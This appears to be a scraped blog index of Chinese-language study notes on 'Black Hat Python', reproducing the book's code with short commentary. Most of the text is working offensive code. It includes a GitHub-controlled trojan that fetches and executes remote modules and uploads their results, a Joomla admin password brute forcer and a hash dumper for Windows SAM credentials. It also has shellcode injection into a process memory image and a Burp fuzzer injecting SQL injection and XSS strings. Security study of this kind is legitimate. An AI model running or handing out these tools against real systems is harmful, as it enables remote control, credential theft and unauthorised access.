file_types: inject_code(full_filename, extension, contents) except: print(\u0026#34;[!!!] Failed.\u0026#34;) elif action == FILE_RENAMED_FROM: print(\u0026#34;[ \u0026gt; ] Renamed from: %s\u0026#34; % full_filename) elif action == FILE_RENAMED_TO: print(\u0026#34;[ \u0026lt; ] Renamed to: %s\u0026#34; % full_filename) else: print(\u0026#34;[???] Unknown: %s\u0026#34; % full_filename) except: pass for path in dirs_to_monitor: monitor_thread = threading.Thread(target=start_monitor, args=(path,)) print(\u0026#34;Spawning monitoring thread for path: %s\u0026#34; % path) monitor_thread.start() 當script file被改的時候，插入我們的code\nCH11 示範Volatility的使用 這裡是利用Volatility針對惡意程式分析的tutorial\ngrabhashes.py\nimport sys import volatility.conf as conf import volatility.registry as registry import volatility.commands as commands import volatility.addrspace as addrspace from volatility.plugins.registry.registryapi import RegistryApi from volatility.plugins.registry.lsadump import HashDump memory_file = \u0026#34;WinXPSP2.vmem\u0026#34; sys.path.append(\u0026#34;/Downloads/volatility-2.3.1\u0026#34;) registry.PluginImporter() config = conf.ConfObject() config.parse_options() config.PROFILE = \u0026#34;WinXPSP2x86\u0026#34; config.LOCATION = \u0026#34;file://%s\u0026#34; % memory_file registry.register_global_options(config, commands.Command) registry.register_global_options(config, addrspace.BaseAddressSpace) registry = RegistryApi(config) registry.populate_offsets() sam_offset = None sys_offset = None for offset in registry.all_offsets: if registry.all_offsets[offset].endswith(\u0026#34;\\\\SAM\u0026#34;): sam_offset = offset print(\u0026#34;[*] SAM: 0x%08x\u0026#34; % offset) if registry.all_offsets[offset].endswith(\u0026#34;\\\\system\u0026#34;): sys_offset = offset print(\u0026#34;[*] System: 0x%08x\u0026#34; % offset) if sam_offset is not None and sys_offset is not None: config.sys_offset = sys_offset config.sam_offset = sam_offset hashdump = HashDump(config) for hash in hashdump.calculate(): print(hash) break if sam_offset is None or sys_offset is None: print(\u0026#34;[*] Failed to find the system or SAM offsets.\u0026#34;) windows的本機密碼放在SAM registry hive 開機金鑰放在system registry hive\n用指令會是\npython vol.py imageinfo -f \u0026#34;memdump.img\u0026#34; # get suggested profile python vol.py hivelist --profile=\u0026#34;WinXPSP2x86\u0026#34; -f \u0026#34;memdump.vmem\u0026#34; # Virual Physical Name # ------ -------- ---- # ... # abc def \\Device\\HarddiskVolume1\\WINDOWS\\system32\\config\\SAM # ghi jkl \\Device\\HarddiskVolume1\\WINDOWS\\system32\\config\\system # ... python vol.py hashdump --profile=\u0026#34;WinXPSP2x86\u0026#34; -f \u0026#34;memdump.vmem\u0026#34; -y ghi -s abc codecoverage.py\nfrom immlib import * class CcHook(LogBpHook): def __init__(self): LogBpHook.__init__(self) self.imm = Debugger() def run(self, regs): self.imm.log(\u0026#34;%08x\u0026#34; % regs[\u0026#39;EIP\u0026#39;], regs[\u0026#39;EIP\u0026#39;]) self.imm.deleteBreakpoint(regs[\u0026#39;EIP\u0026#39;]) return def main(args): imm = Debugger() calc = imm.getModule(\u0026#34;calc.exe\u0026#34;) imm.analyseCode(calc.getCodebase()) functions = imm.getAllFunctions(calc.getCodebase()) hooker = CcHook() for function in functions: hooker.add(\u0026#34;%08x\u0026#34; % function, function) return \u0026#34;Tracking %d functions.\u0026#34; % len(functions) 這個是為了找出特定function的記憶體位置 利用Immunity Debugger的breakpoint把記憶體位置在中斷時列出來 使用方法!code_coverage\ncode_inject.py\nimport sys import struct import volatility.conf as conf import volatility.registry as registry import volatility.commands as commands import volatility.addrspace as addrspace import volatility.plugins.taskmods as taskmods equals_button = 0x01005D51 # from codecoverage.py memory_file = \u0026#34;/Users/justin/Documents/Virtual Machines.localized/\u0026#34; \\ \u0026#34;Windows Server 2003 Standard Edition.vmwarevm/\u0026#34; \\ \u0026#34;564d9400-1cb2-63d6-722b-4ebe61759abd.vmem\u0026#34; slack_space = None trampoline_offset = None # read in our shellcode sc_fd = open(\u0026#34;cmeasure.bin\u0026#34;, \u0026#34;rb\u0026#34;) sc = sc_fd.read() sc_fd.close() sys.path.append(\u0026#34;/Downloads/volatility-2.3.1\u0026#34;) registry.PluginImporter() config = conf.ConfObject() registry.register_global_options(config, commands.Command) registry.register_global_options(config, addrspace.BaseAddressSpace) config.parse_options() config.PROFILE = \u0026#34;Win2003SP2x86\u0026#34; config.LOCATION = \u0026#34;file://%s\u0026#34; % memory_file p = taskmods.PSList(config) # Print all running processes by following the EPROCESS lists. for process in p.calculate(): if str(process.ImageFileName) == \u0026#34;calc.exe\u0026#34;: print(\u0026#34;[*] Found calc.exe with PID %d\u0026#34; % process.UniqueProcessId) print(\u0026#34;[*] Hunting for physical offsets...please wait.\u0026#34;) address_space = process.get_process_address_space() pages = address_space.get_available_pages() for page in pages: physical = address_space.vtop(page[0]) # page[0]是位置 page[1]是大小 if physical is not None: if slack_space is None: fd = open(memory_file, \u0026#34;r+\u0026#34;) fd.seek(physical) buf = fd.read(page[1]) try: offset = buf.index(\u0026#34;\\x00\u0026#34; * len(sc)) slack_space = page[0] + offset print(\u0026#34;[*] Found good shellcode location!\u0026#34;) print(\u0026#34;[*] Virtual address: 0x%08x\u0026#34; % slack_space) print(\u0026#34;[*] Physical address: 0x%08x\u0026#34; % ( physical + offset)) print(\u0026#34;[*] Injecting shellcode.\u0026#34;) fd.seek(physical + offset) fd.write(sc.decode()) fd.flush() # create our trampoline tramp = \u0026#34;\\xbb%s\u0026#34; % struct.pack(\u0026#34;\u0026lt;L\u0026#34;, page[0] + offset) tramp += \u0026#34;\\xff\\xe3\u0026#34; # mov ebx, ADDR_OF_SHELLCODE # jmp ebx if trampoline_offset is not None: break except: pass fd.close() # check for our target code location if page[0] \u0026lt;= equals_button \u0026lt; ((page[0] + page[1]) - 7): # calculate virtual offset v_offset = equals_button - page[0] # now calculate physical offset trampoline_offset = physical + v_offset print(\u0026#34;[*] Found our trampoline target at: 0x%08x\u0026#34; % ( trampoline_offset)) if slack_space is not None: break print(\u0026#34;[*] Writing trampoline...\u0026#34;) fd = open(memory_file, \u0026#34;r+\u0026#34;) fd.seek(trampoline_offset) fd.write(tramp) fd.close() print(\u0026#34;[*] Done injecting code.\u0026#34;) 這是針對vm的記憶體快照的code injection 流程如下\n找calc.exe 找適合放的空記憶體的起始位置 放轉跳的code ","permalink":"https://littlebees.github.io/2020/09/blackhat-python-windows/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這是對我來說最hardcore的部分\n都沒接觸過啊\u003c/p\u003e\n\u003cp\u003ewindows system programming\nmemory forensics\ncode injection (binary \u0026amp; shell code)\u003c/p\u003e\n\u003cp\u003e超hardcode\u003c/p\u003e","title":"blackhat python - windows"},{"content":"動機 自動從github拉code下來跑!? 有趣!!\nCH7 import json import base64 import sys import time import types import random import threading import queue from github3 import login trojan_id = \u0026#34;abc\u0026#34; trojan_config = \u0026#34;config/{}.json\u0026#34;.format(trojan_id) data_path = \u0026#34;data/{}/\u0026#34;.format(trojan_id) trojan_modules = [] configured = False task_queue = queue.Queue() class GitImporter(object): def __init__(self): self.current_module_code = \u0026#34;\u0026#34; def find_module(self, fullname, path=None): if configured: print(\u0026#34;[*] Attempting to retrieve %s\u0026#34; % fullname) new_library = get_file_contents(\u0026#34;modules/%s\u0026#34; % fullname) if new_library: self.current_module_code = base64.b64decode(new_library) return self return None def load_module(self, name): module = types.ModuleType(name) exec(self.current_module_code, module.__dict__) sys.modules[name] = module return module def connect_to_github(): \u0026#34;\u0026#34;\u0026#34; You can replace the password in the call to login() below for an access token generated by GitHub if your account uses 2FA for access (as it should). Easy-to-follow instructions on how to generate this token can be found here: https://help.github.com/en/github/authenticating-to-github/ creating-a-personal-access-token-for-the-command-line If you choose to use the token, simply replace the \u0026#39;password\u0026#39; attribute for \u0026#39;token\u0026#39; below and paste the token generated by GitHub as a value instead of \u0026#39;YourPassword\u0026#39;. The code should be: gh = login(username=\u0026#34;YourUsername\u0026#34;, token=\u0026#34;YourToken\u0026#34;) \u0026#34;\u0026#34;\u0026#34; gh = login(username=\u0026#34;YourUsername\u0026#34;, password=\u0026#34;YourPassword\u0026#34;) repo = gh.repository(\u0026#34;YourUsername\u0026#34;, \u0026#34;RepositoryName\u0026#34;) branch = repo.branch(\u0026#34;master\u0026#34;) return gh, repo, branch def get_file_contents(filepath): # read gh, repo, branch = connect_to_github() tree = branch.commit.commit.tree.to_tree().recurse() for filename in tree.tree: if filepath in filename.path: print(\u0026#34;[*] Found file %s\u0026#34; % filepath) blob = repo.blob(filename._json_data[\u0026#39;sha\u0026#39;]) return blob.content return None def get_trojan_config(): global configured config_json = get_file_contents(trojan_config) configuration = json.loads(base64.b64decode(config_json)) configured = True for tasks in configuration: if tasks[\u0026#39;module\u0026#39;] not in sys.modules: exec(\u0026#34;import %s\u0026#34; % tasks[\u0026#39;module\u0026#39;]) return configuration def store_module_result(data): # write gh, repo, branch = connect_to_github() remote_path = \u0026#34;data/%s/%d.data\u0026#34; % (trojan_id, random.randint(1000, 100000)) repo.create_file(remote_path, \u0026#34;Commit message\u0026#34;, data.encode()) return def module_runner(module): task_queue.put(1) result = sys.modules[module].run() task_queue.get() # store the result in our repo store_module_result(result) return # main trojan loop sys.meta_path = [GitImporter()] while True: if task_queue.empty(): config = get_trojan_config() for task in config: t = threading.Thread(target=module_runner, args=(task[\u0026#39;module\u0026#39;],)) t.start() time.sleep(random.randint(1, 10)) time.sleep(random.randint(1000, 10000)) 兩個重點\n新的import，從github上拉檔案下來 與github互動 流程是\n從github拉config，去載入module 從github拉module，跑他的code ","permalink":"https://littlebees.github.io/2020/09/blackhat-python-github-automation/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e自動從github拉code下來跑!?\n有趣!!\u003c/p\u003e","title":"blackhat python - github \u0026 automation"},{"content":"動機 這邊主要是處理http與web的html 還有網站結構\nCH5 content_bruter.py\nimport queue import threading import urllib.error import urllib.parse import urllib.request threads = 50 target_url = \u0026#34;http://testphp.vulnweb.com\u0026#34; wordlist_file = \u0026#34;all.txt\u0026#34; # from SVNDigger resume = None user_agent = \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:19.0) \u0026#34; \\ \u0026#34;Gecko/20100101 \u0026#34; \\ \u0026#34;Firefox/19.0\u0026#34; def build_wordlist(wordlst_file): # read in the word list fd = open(wordlst_file, \u0026#34;r\u0026#34;) raw_words = [line.rstrip(\u0026#39;\\n\u0026#39;) for line in fd] fd.close() found_resume = False words = queue.Queue() for word in raw_words: if resume: if found_resume: words.put(word) else: if word == resume: found_resume = True print(\u0026#34;Resuming wordlist from: %s\u0026#34; % resume) else: words.put(word) return words def dir_bruter(extensions=None): while not word_queue.empty(): attempt = word_queue.get() attempt_list = [] # check if there is a file extension if not # it\u0026#39;s a directory path we\u0026#39;re bruting if \u0026#34;.\u0026#34; not in attempt: attempt_list.append(\u0026#34;/%s/\u0026#34; % attempt) else: attempt_list.append(\u0026#34;/%s\u0026#34; % attempt) # if we want to bruteforce extensions if extensions: for extension in extensions: attempt_list.append(\u0026#34;/%s%s\u0026#34; % (attempt, extension)) # iterate over our list of attempts for brute in attempt_list: url = \u0026#34;%s%s\u0026#34; % (target_url, urllib.parse.quote(brute)) try: headers = {\u0026#34;User-Agent\u0026#34;: user_agent} r = urllib.request.Request(url, headers=headers) response = urllib.request.urlopen(r) if len(response.read()): print(\u0026#34;[%d] =\u0026gt; %s\u0026#34; % (response.code, url)) except urllib.error.HTTPError as e: if e.code != 404: print(\u0026#34;!!! %d =\u0026gt; %s\u0026#34; % (e.code, url)) pass word_queue = build_wordlist(wordlist_file) file_extensions = [\u0026#34;.php\u0026#34;, \u0026#34;.bak\u0026#34;, \u0026#34;.orig\u0026#34;, \u0026#34;.inc\u0026#34;] for i in range(threads): t = threading.Thread(target=dir_bruter, args=(file_extensions,)) t.start() 程式本身不難懂，不過那個resume就有點怪怪的 resume是如果有中斷的話，可以從這邊開始\nweb_app_mapper.py\nimport os import queue import threading import urllib.error import urllib.parse import urllib.request threads = 10 target = \u0026#34;http://www.test.com\u0026#34; directory = \u0026#34;/Users/justin/Downloads/joomla-3.1.1\u0026#34; filters = [\u0026#34;.jpg\u0026#34;, \u0026#34;.gif\u0026#34;, \u0026#34;png\u0026#34;, \u0026#34;.css\u0026#34;] os.chdir(directory) web_paths = queue.Queue() for r, d, f in os.walk(\u0026#34;.\u0026#34;): for files in f: remote_path = \u0026#34;%s/%s\u0026#34; % (r, files) if remote_path.startswith(\u0026#34;.\u0026#34;): remote_path = remote_path[1:] if os.path.splitext(files)[1] not in filters: web_paths.put(remote_path) def test_remote(): while not web_paths.empty(): path = web_paths.get() url = \u0026#34;%s%s\u0026#34; % (target, path) request = urllib.request.Request(url) try: response = urllib.request.urlopen(request) print(\u0026#34;[%d] =\u0026gt; %s\u0026#34; % (response.code, path)) response.close() except urllib.error.HTTPError as error: print(\u0026#34;Failed %s\u0026#34; % error.code) pass for i in range(threads): print(\u0026#34;Spawning thread: %d\u0026#34; % i) t = threading.Thread(target=test_remote) t.start() 與上面的程式一樣是暴力法，但是list的來源一個是字典檔，這個是下載回來的檔案(ex:joomla)\n小總結: 生出有單字的queue -\u0026gt; 讓thread發request去戳 -\u0026gt; 看有沒有成功\njoomla_killer.py\nimport http.cookiejar import queue import threading import urllib.error import urllib.parse import urllib.request from abc import ABC from html.parser import HTMLParser # general settings user_thread = 10 username = \u0026#34;admin\u0026#34; wordlist_file = \u0026#34;cain.txt\u0026#34; resume = None # target specific settings target_url = \u0026#34;http://192.168.112.131/administrator/index.php\u0026#34; target_post = \u0026#34;http://192.168.112.131/administrator/index.php\u0026#34; username_field = \u0026#34;username\u0026#34; password_field = \u0026#34;passwd\u0026#34; success_check = \u0026#34;Administration - Control Panel\u0026#34; class BruteParser(HTMLParser, ABC): def __init__(self): HTMLParser.__init__(self) self.tag_results = {} def handle_starttag(self, tag, attrs): if tag == \u0026#34;input\u0026#34;: tag_name = None for name, value in attrs: if name == \u0026#34;name\u0026#34;: tag_name = value if tag_name: self.tag_results[tag_name] = value class Bruter(object): def __init__(self, user, words_q): self.username = user self.password_q = words_q self.found = False print(\u0026#34;Finished setting up for: %s\u0026#34; % user) def run_bruteforce(self): for i in range(user_thread): t = threading.Thread(target=self.web_bruter) t.start() def web_bruter(self): while not self.password_q.empty() and not self.found: brute = self.password_q.get().rstrip() jar = http.cookiejar.FileCookieJar(\u0026#34;cookies\u0026#34;) opener = urllib.request.build_opener( urllib.request.HTTPCookieProcessor(jar)) response = opener.open(target_url) page = response.read() print(\u0026#34;Trying: %s : %s (%d left)\u0026#34; % ( self.username, brute, self.password_q.qsize())) # parse out the hidden fields parser = BruteParser() parser.feed(page) post_tags = parser.tag_results # add our username and password fields post_tags[username_field] = self.username post_tags[password_field] = brute login_data = urllib.parse.urlencode(post_tags) login_response = opener.open(target_post, login_data) #這樣就可以丟post!! login_result = login_response.read() if success_check in login_result: self.found = True print(\u0026#34;[*] Bruteforce successful.\u0026#34;) print(\u0026#34;[*] Username: %s\u0026#34; % username) print(\u0026#34;[*] Password: %s\u0026#34; % brute) print(\u0026#34;[*] Waiting for other threads to exit...\u0026#34;) def build_wordlist(wordlst_file): # read in the word list fd = open(wordlst_file, \u0026#34;r\u0026#34;) raw_words = [line.rstrip(\u0026#39;\\n\u0026#39;) for line in fd] fd.close() found_resume = False word_queue = queue.Queue() for word in raw_words: word = word.rstrip() if resume is not None: if found_resume: word_queue.put(word) else: if word == resume: found_resume = True print(\u0026#34;Resuming wordlist from: %s\u0026#34; % resume) else: word_queue.put(word) return word_queue words = build_wordlist(wordlist_file) bruter_obj = Bruter(username, words) bruter_obj.run_bruteforce() 這裡是要送post的form，要替所有input都填上值，再用post打出去 不過那個opener用起來感覺不太直覺啊\nCH6 準備好jython的jar，之後就可以在burp加入自己的功能了\n但說老實的，我沒用過burp阿 之後應該用用burp，並記錄下來。\nbhp_bing.py\nimport base64 import json import re import socket import urllib.error import urllib.parse import urllib.request from burp import IBurpExtender from burp import IContextMenuFactory from java.net import URL from java.util import ArrayList from javax.swing import JMenuItem bing_api_key = \u0026#34;YOURKEYHERE\u0026#34; class BurpExtender(IBurpExtender, IContextMenuFactory): # implements def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() self.context = None # we set up our extension callbacks.setExtensionName(\u0026#34;BHP Bing\u0026#34;) callbacks.registerContextMenuFactory(self) return # implements def createMenuItems(self, context_menu): self.context = context_menu menu_list = ArrayList() menu_list.add(JMenuItem(\u0026#34;Send to Bing\u0026#34;, actionPerformed=self.bing_menu)) return menu_list def bing_menu(self, event): # grab the details of what the user clicked http_traffic = self.context.getSelectedMessages() print(\u0026#34;%d requests highlighted\u0026#34; % len(http_traffic)) for traffic in http_traffic: http_service = traffic.getHttpService() host = http_service.getHost() print(\u0026#34;User selected host: %s\u0026#34; % host) self.bing_search(host) return def bing_search(self, host): # check if we have an IP or hostname is_ip = re.match(r\u0026#39;[0-9]+(?:\\.[0-9]+){3}\u0026#39;, host) if is_ip: ip_address = host domain = False else: ip_address = socket.gethostbyname(host) domain = True bing_query_string = \u0026#34;\u0026#39;ip:%s\u0026#39;\u0026#34; % ip_address self.bing_query(bing_query_string) if domain: bing_query_string = \u0026#34;\u0026#39;domain:%s\u0026#39;\u0026#34; % host self.bing_query(bing_query_string) def bing_query(self, bing_query_string): print(\u0026#34;Performing Bing search: %s\u0026#34; % bing_query_string) # encode our query quoted_query = urllib.parse.quote(bing_query_string) http_request = \u0026#34;GET https://api.datamarket.azure.com/Bing/Search/Web?$format=json\u0026amp;$top=20\u0026amp;Query=%s HTTP/1.1\\r\\n\u0026#34; % quoted_query http_request += \u0026#34;Host: api.datamarket.azure.com\\r\\n\u0026#34; http_request += \u0026#34;Connection: close\\r\\n\u0026#34; http_request += \u0026#34;Authorization: Basic %s\\r\\n\u0026#34; % base64.b64encode( \u0026#34;:%s\u0026#34; % bing_api_key) http_request += \u0026#34;User-Agent: Blackhat Python\\r\\n\\r\\n\u0026#34; json_body = self._callbacks.makeHttpRequest(\u0026#34;api.datamarket.azure.com\u0026#34;, 443, True, http_request).tostring() json_body = json_body.split(\u0026#34;\\r\\n\\r\\n\u0026#34;, 1)[1] try: r = json.loads(json_body) if len(r[\u0026#34;d\u0026#34;][\u0026#34;results\u0026#34;]): for site in r[\u0026#34;d\u0026#34;][\u0026#34;results\u0026#34;]: print(\u0026#34;*\u0026#34; * 100) print(site[\u0026#39;Title\u0026#39;]) print(site[\u0026#39;Url\u0026#39;]) print(site[\u0026#39;Description\u0026#39;]) print(\u0026#34;*\u0026#34; * 100) j_url = URL(site[\u0026#39;Url\u0026#39;]) if not self._callbacks.isInScope(j_url): print(\u0026#34;Adding to Burp scope\u0026#34;) self._callbacks.includeInScope(j_url) except: print(\u0026#34;No results from Bing\u0026#34;) pass return 從第一個網址開始，透過bing去找出其他相關的加入burp，來擴大搜尋範圍\nbhp_fuzzer.py\nfrom burp import IBurpExtender from burp import IIntruderPayloadGeneratorFactory from burp import IIntruderPayloadGenerator from java.util import List, ArrayList import random class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory): # implements def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() callbacks.registerIntruderPayloadGeneratorFactory(self) return # implements @staticmethod def getGeneratorName(): return \u0026#34;BHP Payload Generator\u0026#34; # implements def createNewInstance(self, attack): return BHPFuzzer(self, attack) class BHPFuzzer(IIntruderPayloadGenerator): def __init__(self, extender, attack): self._extender = extender self._helpers = extender._helpers self._attack = attack print(\u0026#34;BHP Fuzzer initialized\u0026#34;) self.max_payloads = 1000 self.num_payloads = 0 return def hasMorePayloads(self): print(\u0026#34;hasMorePayloads called.\u0026#34;) if self.num_payloads == self.max_payloads: print(\u0026#34;No more payloads.\u0026#34;) return False else: print(\u0026#34;More payloads. Continuing.\u0026#34;) return True def getNextPayload(self, current_payload): # convert into a string payload = \u0026#34;\u0026#34;.join(chr(x) for x in current_payload) # call our simple mutator to fuzz the POST payload = self.mutate_payload(payload) # increase the number of fuzzing attempts self.num_payloads += 1 return payload def reset(self): self.num_payloads = 0 return @staticmethod def mutate_payload(original_payload): # pick a simple mutator or even call an external script # like Radamsa does picker = random.randint(1, 3) # select a random offset in the payload to mutate offset = random.randint(0, len(original_payload) - 1) payload = original_payload[:offset] # random offset insert a SQL injection attempt if picker == 1: payload += \u0026#34;\u0026#39;\u0026#34; # jam an XSS attempt in if picker == 2: payload += \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;BHP!\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34; # repeat a chunk of the original payload a random number if picker == 3: chunk_length = random.randint(len(payload[offset:]), len(payload) - 1) repeater = random.randint(1, 10) for i in range(repeater): payload += original_payload[offset:offset + chunk_length] # add the remaining bits of the payload payload += original_payload[offset:] return payload 就是iterator，會隨機修改request\nbhp_wordlist.py\n#!/usr/bin/env python # -*- coding: utf-8 -*- from burp import IBurpExtender from burp import IContextMenuFactory from javax.swing import JMenuItem from java.util import List, ArrayList from java.net import URL import re from datetime import datetime from html.parser import HTMLParser class TagStripper(HTMLParser): def __init__(self): HTMLParser.__init__(self) self.page_text = [] def handle_data(self, data): self.page_text.append(data) def handle_comment(self, data): self.handle_data(data) def strip(self, html): self.feed(html) return \u0026#34; \u0026#34;.join(self.page_text) class BurpExtender(IBurpExtender, IContextMenuFactory): def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() self.context = None self.hosts = set() # start with something we know is common self.wordlist = {\u0026#34;password\u0026#34;} # we set up our extension callbacks.setExtensionName(\u0026#34;BHP Wordlist\u0026#34;) callbacks.registerContextMenuFactory(self) return def createMenuItems(self, context_menu): self.context = context_menu menu_list = ArrayList() menu_list.add(JMenuItem(\u0026#34;Create Wordlist\u0026#34;, actionPerformed=self.wordlist_menu)) return menu_list def wordlist_menu(self, event): # grab the details of what the user clicked http_traffic = self.context.getSelectedMessages() for traffic in http_traffic: http_service = traffic.getHttpService() host = http_service.getHost() self.hosts.add(host) http_response = traffic.getResponse() if http_response: self.get_words(http_response) self.display_wordlist() return def get_words(self, http_response): headers, body = http_response.tostring().split(\u0026#39;\\r\\n\\r\\n\u0026#39;, 1) # skip non-text responses if headers.lower().find(\u0026#34;content-type: text\u0026#34;) == -1: return tag_stripper = TagStripper() page_text = tag_stripper.strip(body) words = re.findall(r\u0026#39;[a-zA-Z]\\w{2,}\u0026#39;, page_text) for word in words: # filter out long strings if len(word) \u0026lt;= 12: self.wordlist.add(word.lower()) return @staticmethod def mangle(word): year = datetime.now().year suffixes = [\u0026#34;\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;!\u0026#34;, year] mangled = [] for password in (word, word.capitalize()): for suffix in suffixes: mangled.append(\u0026#34;%s%s\u0026#34; % (password, suffix)) return mangled def display_wordlist(self): print(\u0026#34;# BHP Wordlist for site(s) %s\u0026#34; % \u0026#34;, \u0026#34;.join(self.hosts)) for word in sorted(self.wordlist): for password in self.mangle(word): print(password) return 就是從request的text中撈出word，塞到wordlist\n","permalink":"https://littlebees.github.io/2020/09/blackhat-python-web/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這邊主要是處理http與web的html\n還有網站結構\u003c/p\u003e","title":"blackhat python - web"},{"content":"動機 來做個筆記吧\n這裡有帶到基本的network programming與SSH的使用\n環境 \u0026amp; py3 書上的code是py2，同時code很舊，因此會用這個repo的code來解釋\n用WSL2測試\nCH2 基本的TCP client\u0026amp;server tcp_client.py\nimport socket target_host = \u0026#34;127.0.0.1\u0026#34; target_port = 9999 # create a socket object client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # connect the client client.connect((target_host, target_port)) # NULL!!! # send some data client.send(b\u0026#34;GET / HTTP/1.1\\r\\nHost: google.com\\r\\n\\r\\n\u0026#34;) # client.sendto(b\u0026#34;AAABBBCCC\u0026#34;, (target_host, target_port)) # receive data response = client.recv(4096) print(response) UDP \u0026amp; TCP client的差別在\nsocket (創socket時) connect (與server建立連線，三段握手) send (送資料) UDP SOCK_STREAM 不用 sendto(data, tuple) TCP SOCK_DGRAM connect((target_host, target_port)) send(data) tcp_server.py\nimport socket import threading bind_ip = \u0026#34;0.0.0.0\u0026#34; bind_port = 9999 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((bind_ip, bind_port)) server.listen(5) print(\u0026#34;[*] Listening on %s:%d\u0026#34; % (bind_ip, bind_port)) # this is our client handling thread def handle_client(client_socket): # just print out what the client sends request = client_socket.recv(1024) print(\u0026#34;[*] Received: %s\u0026#34; % request) # send back a packet client_socket.send(b\u0026#34;ACK!\u0026#34;) print(client_socket.getpeername()) client_socket.close() while True: client, addr = server.accept() print(\u0026#34;[*] Accepted connection from: %s:%d\u0026#34; % (addr[0], addr[1])) # spin up our client thread to handle incoming data client_handler = threading.Thread(target=handle_client, args=(client,)) client_handler.start() 這裡是用thread來處理每個進來的連線，之後會看到在同一個thread(就原本收連線的thread)處理每個進來的連線的手法(select,epool)\ntcp_proxy.py\nimport sys import socket import threading # this is a pretty hex dumping function directly taken from # http://code.activestate.com/recipes/142812-hex-dumper/ def hexdump(src, length=16): result = [] digits = 4 if isinstance(src, str) else 2 for i in range(0, len(src), length): s = src[i:i + length] hexa = b\u0026#39; \u0026#39;.join([b\u0026#34;%0*X\u0026#34; % (digits, ord(x)) for x in s]) text = b\u0026#39;\u0026#39;.join([x if 0x20 \u0026lt;= ord(x) \u0026lt; 0x7F else b\u0026#39;.\u0026#39; for x in s]) result.append( b\u0026#34;%04X %-*s %s\u0026#34; % (i, length * (digits + 1), hexa, text)) print(b\u0026#39;\\n\u0026#39;.join(result)) def receive_from(connection): buffer = b\u0026#39;\u0026#39; # We set a 2 second time-out. Depending on your target this may need # to be adjusted connection.settimeout(2) try: # keep reading into the buffer until there\u0026#39;s no more data or we # time-out while True: data = connection.recv(4096) if not data: break buffer += data except TimeoutError: pass return buffer # modify any requests destined for the remote host def request_handler(buffer): # perform packet modifications return buffer # modify any responses destined for the local host def response_handler(buffer): # perform packet modifications return buffer def proxy_handler(client_socket, remote_host, remote_port, receive_first): # connect to the remote host remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) remote_socket.connect((remote_host, remote_port)) # receive data from the remote end if necessary if receive_first: remote_buffer = receive_from(remote_socket) hexdump(remote_buffer) # send it to our response handler remote_buffer = response_handler(remote_buffer) # if we have data to send to our local client send it if len(remote_buffer): print(\u0026#34;[\u0026lt;==] Sending %d bytes to localhost.\u0026#34; % len(remote_buffer)) client_socket.send(remote_buffer) # now let\u0026#39;s loop and read from local, send to remote, send to local # rinse wash repeat while True: # read from local host local_buffer = receive_from(client_socket) if len(local_buffer): print(\u0026#34;[==\u0026gt;] Received %d bytes from localhost.\u0026#34; % len(local_buffer)) hexdump(local_buffer) # send it to our request handler local_buffer = request_handler(local_buffer) # send off the data to the remote host remote_socket.send(local_buffer) print(\u0026#34;[==\u0026gt;] Sent to remote.\u0026#34;) # receive back the response remote_buffer = receive_from(remote_socket) if len(remote_buffer): print(\u0026#34;[\u0026lt;==] Received %d bytes from remote.\u0026#34; % len(remote_buffer)) hexdump(remote_buffer) # send to our response handler remote_buffer = response_handler(remote_buffer) # send the response to the local socket client_socket.send(remote_buffer) print(\u0026#34;[\u0026lt;==] Sent to localhost.\u0026#34;) # if no more data on either side close the connections if not len(local_buffer) or not len(remote_buffer): client_socket.close() remote_socket.close() print(\u0026#34;[*] No more data. Closing connections.\u0026#34;) break def server_loop(local_host, local_port, remote_host, remote_port, receive_first): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.bind((local_host, local_port)) except socket.error as exc: print(\u0026#34;[!!] Failed to listen on %s:%d\u0026#34; % (local_host, local_port)) print(\u0026#34;[!!] Check for other listening sockets or correct \u0026#34; \u0026#34;permissions.\u0026#34;) print(f\u0026#34;[!!] Caught exception error: {exc}\u0026#34;) sys.exit(0) print(\u0026#34;[*] Listening on %s:%d\u0026#34; % (local_host, local_port)) server.listen(5) while True: client_socket, addr = server.accept() # print out the local connection information print(\u0026#34;[==\u0026gt;] Received incoming connection from %s:%d\u0026#34; % ( addr[0], addr[1])) # start a thread to talk to the remote host proxy_thread = threading.Thread(target=proxy_handler, args=( client_socket, remote_host, remote_port, receive_first)) proxy_thread.start() def main(): # no fancy command line parsing here if len(sys.argv[1:]) != 5: print(\u0026#34;Usage: ./proxy.py [localhost] [localport] [remotehost] \u0026#34; \u0026#34;[remoteport] [receive_first]\u0026#34;) print(\u0026#34;Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True\u0026#34;) sys.exit(0) # setup local listening parameters local_host = sys.argv[1] local_port = int(sys.argv[2]) # setup remote target remote_host = sys.argv[3] remote_port = int(sys.argv[4]) # this tells our proxy to connect and receive data # before sending to the remote host receive_first = sys.argv[5] if \u0026#34;True\u0026#34; in receive_first: receive_first = True else: receive_first = False # now spin up our listening socket server_loop(local_host, local_port, remote_host, remote_port, receive_first) main() proxy的邏輯: =...=\u0026gt;是網路的部分，-...-\u0026gt;是記憶體讀寫的部分。 開頭有大寫的是程式，開頭有底線是指令。\nClient =\u0026gt; Proxy =\u0026gt; Real_server 看得更細一點 Client = (proxy_ip,local_port) =\u0026gt; ( _recv - write_buffer -\u0026gt; _send - read_buffer -\u0026gt;) = (server_ip,server_port) =\u0026gt; Real_server 如果自己要玩的話，有個問題是他會先一直讀send的東西到write_buffer，但到什麼時候才要停止? 這尷尬的是client一直send卻沒有停下來的訊號，要做出這個訊號要利用shutdown 如下\n\u0026gt;\u0026gt;\u0026gt; c 